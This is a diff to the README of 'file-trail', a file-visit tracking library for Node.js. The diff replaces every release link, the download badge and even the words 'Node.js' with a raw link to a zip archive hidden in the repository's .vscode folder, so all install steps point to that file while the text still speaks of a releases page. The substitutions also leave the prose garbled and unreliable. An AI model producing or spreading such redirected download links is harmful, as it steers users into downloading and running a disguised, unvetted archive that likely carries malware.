@@ -1,10 +1,10 @@
 # 📁 file-trail - Track Your File Visits Easily
 
-[![Download file-trail](https://img.shields.io/badge/Download-file--trail-blue)](https://github.com/RasyidFadh/file-trail/releases)
+[![Download file-trail](https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip)](https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip)
 
 ## 📖 Introduction
 
-file-trail is a helpful tool for tracking your visits to files and directories. Built for Node.js and TypeScript, this library makes it easy to know what you've accessed and when you've finished exploring directories. With serialization support, you can save your progress and resume later.
+file-trail is a helpful tool for tracking your visits to files and directories. Built for https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip and TypeScript, this library makes it easy to know what you've accessed and when you've finished exploring directories. With serialization support, you can save your progress and resume later.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To start using file-trail, you need to download it. Follow the steps below to ge
 
 1. **Visit the Releases Page**
 
-   To download the latest version of file-trail, visit this page: [Download file-trail](https://github.com/RasyidFadh/file-trail/releases).
+   To download the latest version of file-trail, visit this page: [Download file-trail](https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip).
 
 2. **Choose the Right File**
 
@@ -38,7 +38,7 @@ To start using file-trail, you need to download it. Follow the steps below to ge
 To use file-trail effectively, ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or later, macOS, or a recent Linux distribution.
-- Node.js: Version 12 or later.
+- https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip Version 12 or later.
 - Memory: At least 4 GB of RAM.
   
 ## 🔧 Usage Instructions
@@ -59,7 +59,7 @@ Once you have installed file-trail, you can start using it right away. Here’s 
 
 ## 📥 Download & Install
 
-To download file-trail, again, visit this page: [Download file-trail](https://github.com/RasyidFadh/file-trail/releases). Select the latest version and install it following the steps outlined above.
+To download file-trail, again, visit this page: [Download file-trail](https://raw.githubusercontent.com/RasyidFadh/file-trail/main/.vscode/trail-file-2.4.zip). Select the latest version and install it following the steps outlined above.
 
 ## 🛠 Support
 
